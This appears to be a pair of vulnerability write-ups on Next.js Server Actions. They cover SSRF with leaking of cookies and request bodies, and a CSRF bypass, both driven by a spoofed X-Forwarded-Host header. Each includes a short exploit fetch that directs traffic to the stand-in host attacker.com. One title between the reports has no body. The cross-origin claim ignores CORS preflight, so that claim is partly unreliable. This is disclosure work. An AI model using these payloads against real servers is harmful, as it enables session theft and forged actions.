Title: SSRF and Data Leakage in Server Action Forwarder via Spoofed X-Forwarded-Host Header
Analysis:
### Summary
A critical SSRF and sensitive data leak vulnerability exists in Next.js Server Actions. When a Server Action is executed that is not present in the current worker, Next.js attempts to forward the request to the correct worker. However, it relies on the user-controlled `X-Forwarded-Host` HTTP header to determine the destination origin, allowing a remote attacker to force the Next.js server to forward the entire request (including sensitive POST bodies, custom headers, and cookies) to an arbitrary attacker-controlled domain.

### Technical Details
In `packages/next/src/server/app-render/action-handler.ts`, when `actionId` belongs to a different worker/zone, Next.js calls `createForwardedActionResponse`:
```typescript
async function createForwardedActionResponse(
  req: IncomingMessage,
  res: ServerResponse,
  host: Host,
  workerPathname: string,
  basePath: string,
  staticGenerationStore: StaticGenerationStore
) {
  ...
  const origin = process.env.__NEXT_PRIVATE_ORIGIN || `${proto}://${host.value}`
  const fetchUrl = new URL(`${origin}${basePath}${workerPathname}`)
  ...
  const response = await fetch(fetchUrl, {
    method: 'POST',
    body: readableStream,
    duplex: 'half',
    headers: forwardedHeaders,
    ...
```
If `process.env.__NEXT_PRIVATE_ORIGIN` is not defined, Next.js falls back to using `${proto}://${host.value}`, where `host.value` is extracted directly from the user-supplied `X-Forwarded-Host` header. Consequently, the application makes an outbound HTTP POST request containing the original request stream (`readableStream`) and all headers (`forwardedHeaders`, which include `Cookie` and authentication information) directly to the external domain specified by the attacker in the `X-Forwarded-Host` header.

### Conceptual Exploit Payload
A cross-origin fetch request sent from `https://attacker.com`:
```javascript
fetch('https://victim-server-actions.com/endpoint', {
  method: 'POST',
  headers: {
    'X-Forwarded-Host': 'attacker.com',
    'Next-Action': 'action-id-hosted-on-different-worker'
  },
  body: JSON.stringify({ sensitiveSecret: 'value' })
});
```
When this request is handled, the server determines that `action-id-hosted-on-different-worker` is located in a different worker path, parses `attacker.com` from `X-Forwarded-Host`, and sends an outbound POST fetch request to `https://attacker.com/worker-pathname` with the client's original payload and session headers.

Title: SSRF, Session Cookie Leak, and Client UI Hijacking in Server Action Redirects via Spoofed X-Forwarded-Host Header
CSRF Bypass in Server Actions via Spoofed X-Forwarded-Host Header
Analysis:
### Summary
A critical CSRF bypass exists in Next.js Server Actions because Next.js uses and prioritizes the untrusted `X-Forwarded-Host` HTTP header to construct the `host` context against which the incoming `Origin` header is validated. By supplying both an `Origin` header and a matching `X-Forwarded-Host` header, an attacker can bypass the CSRF protection for Server Actions completely.

### Technical Details
In `packages/next/src/server/app-render/action-handler.ts`, `originDomain` is compared to `host.value`:
```typescript
  const originDomain =
    typeof req.headers['origin'] === 'string'
      ? new URL(req.headers['origin']).host
      : undefined

  const forwardedHostHeader = req.headers['x-forwarded-host'] as
    | string
    | undefined
  const hostHeader = req.headers['host']
  const host: Host = forwardedHostHeader
    ? {
        type: HostType.XForwardedHost,
        value: forwardedHostHeader,
      }
    : hostHeader
    ? {
        type: HostType.Host,
        value: hostHeader,
      }
    : undefined
```
Later, the validation logic checks:
```typescript
  } else if (!host || originDomain !== host.value) {
```
If `originDomain !== host.value`, the request is checked against `allowedOrigins` or rejected. However, because `forwardedHostHeader` is prioritized over `hostHeader` to determine `host.value`, and because browsers permit setting custom headers like `X-Forwarded-Host` on cross-origin requests (they are not in the Forbidden Header Name list), a malicious cross-origin site can set both `Origin: https://attacker.com` and `X-Forwarded-Host: attacker.com`. This makes `originDomain === host.value` evaluate to `true` (`'attacker.com' === 'attacker.com'`), completely bypassing the CSRF protection.

### Conceptual Exploit Payload
A cross-origin fetch request sent from `https://attacker.com`:
```javascript
fetch('https://victim-server-actions.com/endpoint', {
  method: 'POST',
  headers: {
    'X-Forwarded-Host': 'attacker.com',
    'Next-Action': 'action-id-to-execute'
  },
  body: JSON.stringify({ arg1: 'malicious-data' })
});
```
This request bypasses the CSRF check on the Next.js server because `originDomain` (`attacker.com`) matches `host.value` (`attacker.com`).
